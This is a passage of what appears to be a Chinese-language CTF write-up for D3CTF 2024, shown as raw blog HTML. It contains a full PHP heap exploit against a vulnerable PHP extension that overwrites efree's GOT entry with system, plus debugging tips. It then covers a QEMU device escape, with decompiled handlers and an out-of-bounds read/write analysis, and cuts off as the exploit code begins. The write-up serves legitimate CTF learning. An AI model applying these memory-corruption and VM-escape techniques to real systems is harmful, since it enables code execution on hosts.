class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$libc</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>exp：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2Hex</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$hex</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>) - <span class="number">1</span>;<span class="variable">$i</span> &gt;= <span class="number">0</span>;<span class="variable">$i</span>--) <span class="variable">$hex</span>.= <span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]));</span><br><span class="line">    <span class="variable">$hex</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$hex</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$hex</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">int2Str</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$x</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;C&#x27;</span>, <span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$libc</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system_addr</span> = <span class="number">0x4c490</span>;</span><br><span class="line"><span class="variable">$efree_got</span> = <span class="number">0x4038</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;a&quot;</span>, <span class="number">0x40</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;b&quot;</span>, <span class="number">0x3f</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="number">0xe</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$n</span> = <span class="number">0x61</span> + <span class="variable">$i</span>;</span><br><span class="line">    <span class="variable">$aa</span> = <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>, <span class="variable">$n</span>);</span><br><span class="line">    <span class="variable">$aaa</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="variable">$aa</span>, <span class="number">0x40</span>);</span><br><span class="line">    <span class="title function_ invoke__">addHacker</span>(<span class="variable">$aaa</span>, <span class="variable">$b</span>);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;/readflag &gt; /var/www/html/flag.txt\x00&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">editHacker</span>(<span class="number">0</span>,<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">7</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;c&quot;</span>, <span class="number">0x40</span>);</span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$a</span>, <span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">6</span>);</span><br><span class="line"><span class="title function_ invoke__">editHacker</span>(<span class="number">8</span>, <span class="title function_ invoke__">int2str</span>(<span class="variable">$mod_base</span>+<span class="variable">$efree_got</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$a</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">int2str</span>(<span class="variable">$libc_base</span>+<span class="variable">$system_addr</span>),<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$payload</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>这道题我感觉难点在于如何调试。这道题目给出了 <code>docker</code> 环境，所以我们可以在 <code>docker</code> 中启动 <code>gdbserver</code> 远程调试，其做法如下：  </p><img src="/2024/04/29/d3ctf2024/1.png" class="" title="我的图图呢">  <p>然后在另外一个终端中启动 <code>gdb</code>，然后输入 <code>target remote:8888</code> 即可连接<br>这里要注意的是，我 <code>docker</code> 是将其 <code>9999</code> 端口映射到物理机的 <code>8888</code> 端口，所以我在 <code>docker</code> 中启动 <code>gdbserver</code> 使用的是 <code>9999</code> 端口，在物理机中 <code>gdb</code> 远程连接的端口是 <code>8888</code><br>由于题目给的 <code>docker</code> 并没有安装 <code>gdbserver</code>，我们可以通过下面这条命令进行安装  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install gdbserver</span><br></pre></td></tr></table></figure><p>接下来就要说说调试技巧。由于程序要运行很多汇编代码后才会将 <code>vuln.so</code> 模块给加载进来，所以一直在 <code>gdb</code> 中使用 <code>si</code> 是行不通的，我的方法是在 <code>exp.php</code> 中使用 <code>fgetc(STDIN)</code> 来将程序卡住，然后在 <code>gdb</code> 中输入 <code>c</code> 来进行类似于断点的操作，但是这样的 <code>php</code> 文件运行时会发现系统报错说找不到 <code>fgetc</code> 这一个 <code>function</code>，这是应为在 <code>php.ini</code> 文件中将这一个函数给 <code>ban</code> 了，我们可以通过下面这一条指令来找到 <code>php.ini</code> 文件所在的文件夹  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -i | grep <span class="string">&quot;Configuration File (php.ini) Path&quot;</span></span><br></pre></td></tr></table></figure><p>在 <code>php.ini</code> 文件中我们找到 <code>disable_functions</code> 那个地方  </p><img src="/2024/04/29/d3ctf2024/2.png" class="" title="我的图图呢">  <p>可以看见我们要用的 <code>fgetc</code> 函数在最后一行，我们将其删除即可<br>下面给出一条用于查询 <code>php</code> 扩展模块所在的路径的命令  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php-config --extension-dir</span><br></pre></td></tr></table></figure><h1 id="D3EasyEscape"><a href="#D3EasyEscape" class="headerlink" title="D3EasyEscape"></a>D3EasyEscape</h1><p>这道题是 <code>qemu</code> 逃逸，之前没事干学了一下，这不刚好可以用上了，其关键函数如下：<br>l0dev_mmio_read：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">l0dev_mmio_read</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">82LL</span>, <span class="string">&quot;l0dev_mmio_read&quot;</span>);</span><br><span class="line">  dest = <span class="number">-1LL</span>;</span><br><span class="line">  addr_v7 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8</span> * addr_v7 + size &lt;= <span class="number">0x100</span> )</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;dest, (<span class="type">const</span> <span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v6 + <span class="number">0xA00</span>) + addr) + <span class="number">0xC30</span>LL + v6 + <span class="number">4</span>), size);</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>l0dev_pmio_read：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">l0dev_pmio_read</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">104LL</span>, <span class="string">&quot;l0dev_pmio_read&quot;</span>);</span><br><span class="line">  dest = <span class="number">-1LL</span>;</span><br><span class="line">  addr_v7 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8</span> * addr_v7 + size &gt; <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dest, (<span class="type">const</span> <span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)addr + <span class="number">0xC30</span>LL + v6 + <span class="number">4</span>), size);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)dest == <span class="number">666</span> )</span><br><span class="line">    ++dword_123B1CC;</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>l0dev_mmio_write：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">l0dev_mmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, __int64 value, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size_n; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  _QWORD n_4[<span class="number">3</span>]; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> addr_v7; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  n_4[<span class="number">2</span>] = opaque;</span><br><span class="line">  n_4[<span class="number">1</span>] = addr;</span><br><span class="line">  n_4[<span class="number">0</span>] = value;</span><br><span class="line">  size_n = size;</span><br><span class="line">  v8 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">133LL</span>, <span class="string">&quot;l0dev_mmio_write&quot;</span>);</span><br><span class="line">  v9 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  result = (<span class="type">void</span> *)addr;</span><br><span class="line">  addr_v7 = addr;</span><br><span class="line">  <span class="keyword">if</span> ( size_n &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">void</span> *)(<span class="number">8</span> * v9 + size_n);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr_v7 == <span class="number">0x40</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = n_4[<span class="number">0</span>];</span><br><span class="line">        addr_v7 = (*(<span class="type">int</span> (__fastcall **)(_QWORD *))(v8 + <span class="number">0xD48</span>))(n_4) % <span class="number">0x100</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)(addr_v7 + <span class="number">0xC30</span>LL + v8 + <span class="number">4</span>), n_4, size_n);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr_v7 == <span class="number">0x80</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="type">void</span> *)n_4[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> ( n_4[<span class="number">0</span>] &lt;= <span class="number">0x100</span>uLL )</span><br><span class="line">        &#123;</span><br><span class="line">          result = (<span class="type">void</span> *)v8;</span><br><span class="line">          *(_DWORD *)(v8 + <span class="number">0xA00</span>) = n_4[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)(addr_v7 + <span class="number">0xC30</span>LL + v8 + <span class="number">4</span>), n_4, size_n);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>l0dev_pmio_write：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">l0dev_pmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, __int64 value, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  _DWORD n[<span class="number">3</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v6; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = opaque;</span><br><span class="line">  addr_v6 = addr;</span><br><span class="line">  *(_QWORD *)&amp;n[<span class="number">1</span>] = value;</span><br><span class="line">  n[<span class="number">0</span>] = size;</span><br><span class="line">  v9 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">173LL</span>, <span class="string">&quot;l0dev_pmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_123B1CC )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v9 + <span class="number">0xA00</span>) + addr_v6) + <span class="number">0xC30</span>LL + v9 + <span class="number">4</span>), &amp;n[<span class="number">1</span>], n[<span class="number">0</span>]);</span><br><span class="line">  result = (<span class="type">void</span> *)(addr_v6 &gt;&gt; <span class="number">3</span>);</span><br><span class="line">  addr_v10 = addr_v6 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( n[<span class="number">0</span>] &lt;= <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">void</span> *)(<span class="number">8</span> * addr_v10 + n[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = addr_v6;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)addr_v6 + <span class="number">0xC30</span>LL + v9 + <span class="number">4</span>), &amp;n[<span class="number">1</span>], n[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说实话，这道题目我看了好久才找到漏洞，还是做题做太少了。在 <code>l0dev_mmio_write</code> 函数中当 <code>addr_v7 == 0x80</code> 时我们可以对 <code>*(_DWORD *)(v8 + 0xA00)</code> 的值进行设置，而在 <code>l0dev_mmio_read</code> 函数中我们可以相对 <code>*(_DWORD *)(v8 + 0xA00)</code> 某个偏移范围内的数据进行读，在 <code>l0dev_pmio_write</code> 函数中我们可以相对 <code>*(_DWORD *)(v8 + 0xA00)</code> 某个偏移范围内的数据进行写，也就是说这里存在越界读和越界写。观察到 <code>l0dev_mmio_write</code> 函数中下面这一段代码：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( addr_v7 == <span class="number">0x40</span> )&#123;</span><br><span class="line">    v10 = n_4[<span class="number">0</span>];</span><br><span class="line">    addr_v7 = (*(<span class="type">int</span> (__fastcall **)(_QWORD *))(v8 + <span class="number">0xD48</span>))(n_4) % <span class="number">0x100</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)(addr_v7 + <span class="number">0xC30</span>LL + v8 + <span class="number">4</span>), n_4, size_n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看见 <code>(int (__fastcall **)(_QWORD *))(v8 + 0xD48)</code> 处存储的是一个函数指针，通过 <code>gdb</code> 我们可以发现其存储的是 <code>rand_r</code> 函数的地址，该函数位于 <code>libc</code> 上，所以我们可以通过越界读读取此处来获取 <code>libc</code> 的地址。可以看见这个地方是通过函数指针调用了函数，且函数的参数我们是可控的，所以我们可以劫持该函数指针执行 <code>system</code> 函数的地址，然后另函数从参数为 <code>sh</code> 即可实现逃逸<br>exp：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 